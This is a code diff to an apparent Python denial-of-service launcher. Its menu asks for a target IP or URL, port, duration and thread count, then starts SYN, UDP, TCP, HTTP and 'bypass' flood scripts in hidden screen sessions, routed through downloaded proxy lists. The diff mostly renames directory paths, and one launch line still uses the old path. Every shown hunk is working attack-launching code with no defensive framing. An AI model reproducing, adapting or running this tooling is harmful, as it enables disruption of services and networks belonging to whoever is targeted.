@@ -111,7 +111,7 @@ class Home:
 					port = int(input(f"{Color.LG} 🚀 Port: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
-					subprocess.run([f'screen -dm python3 vdh/Method2/vse {ip} {port} {floodtime} {thread}'], shell=True)
+					subprocess.run([f'screen -dm python3 nguyencaosang/Method2/vse {ip} {port} {floodtime} {thread}'], shell=True)
 					for i in range(150):
 						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
 						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
@@ -125,7 +125,7 @@ class Home:
 					port = int(input(f"{Color.LG} 🚀 Port: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
-					subprocess.run([f'screen -dm python3 vdh/Method2/syn {ip} {port} {floodtime} {thread}'], shell=True)
+					subprocess.run([f'screen -dm python3 nguyencaosang/Method2/syn {ip} {port} {floodtime} {thread}'], shell=True)
 					for i in range(150):
 						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
 						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
@@ -140,7 +140,7 @@ class Home:
 					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
 					size = int(input(f"{Color.LG} 🚀 Size: "+Color.RESET))
 					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
-					subprocess.run([f'screen -dm python3 vdh/Method2/tcp {ip} {port} {floodtime} {size} {thread}'], shell=True)
+					subprocess.run([f'screen -dm python3 nguyencaosang/Method2/tcp {ip} {port} {floodtime} {size} {thread}'], shell=True)
 					for i in range(150):
 						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
 						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
@@ -155,7 +155,7 @@ class Home:
 					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
 					size = int(input(f"{Color.LG} 🚀 Size: "+Color.RESET))
 					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
-					subprocess.run([f'screen -dm python3 vdh/Method2/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
+					subprocess.run([f'screen -dm python3 nguyencaosang/Method2/udp {ip} {port} {floodtime} {size} {thread}'], shell=True)
 					for i in range(150):
 						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
 						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
@@ -169,7 +169,7 @@ class Home:
 					port = int(input(f"{Color.LG} 🚀 Port: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} 🚀 Thread: "+Color.RESET))
-					subprocess.run([f'screen -dm python3 vdh/Method2/http {ip} {port} {floodtime} {thread}'], shell=True)
+					subprocess.run([f'screen -dm python3 nguyencaosang/Method2/http {ip} {port} {floodtime} {thread}'], shell=True)
 					for i in range(150):
 						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
 						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
@@ -232,7 +232,7 @@ class Home:
 					reqs = int(input(f"{Color.LG} 🚀 Reqs: "+Color.RESET))
 					with open("vdh/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
-					subprocess.run([f'screen -dm node vdh/Method1/socket {url} vdh/http.txt {floodtime} {reqs}'], shell=True)
+					subprocess.run([f'screen -dm node nguyencaosang/Method1/socket {url} nguyencaosang/http.txt {floodtime} {reqs}'], shell=True)
 					for i in range(150):
 						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
 						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
@@ -244,9 +244,9 @@ class Home:
 				try:
 					url = str(input(f"{Color.LG} 🚀 Url: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
-					with open("vdh/http.txt", 'w') as p:
+					with open("nguyencaosang/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
-					subprocess.run([f'screen -dm node vdh/Method1/flood GET {url} vdh/http.txt {floodtime} 64 1'], shell=True)
+					subprocess.run([f'screen -dm node vdh/Method1/flood GET {url} nguyencaosang/http.txt {floodtime} 64 1'], shell=True)
 					for i in range(150):
 						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
 						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
@@ -258,9 +258,9 @@ class Home:
 				try:
 					url = str(input(f"{Color.LG} 🚀 Url: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
-					with open("vdh/http.txt", 'w') as p:
+					with open("nguyencaosang/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
-					subprocess.run([f'screen -dm node vdh/Method1/httpget {url} {floodtime} 1'], shell=True)
+					subprocess.run([f'screen -dm node nguyencaosang/Method1/httpget {url} {floodtime} 1'], shell=True)
 					for i in range(150):
 						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
 						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
@@ -272,9 +272,9 @@ class Home:
 				try:
 					url = str(input(f"{Color.LG} 🚀 Url: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} 🚀 Time: "+Color.RESET))
-					with open("vdh/http.txt", 'w') as p:
+					with open("nguyencaosang/http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
-					subprocess.run([f'screen -dm node vdh/Method1/bypass {url} {floodtime}'], shell=True)
+					subprocess.run([f'screen -dm node nguyencaosang/Method1/bypass {url} {floodtime}'], shell=True)
 					for i in range(150):
 						print (f"{Color.LG}Starting Attack To ➠ {Color.LG}" + url)
 						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
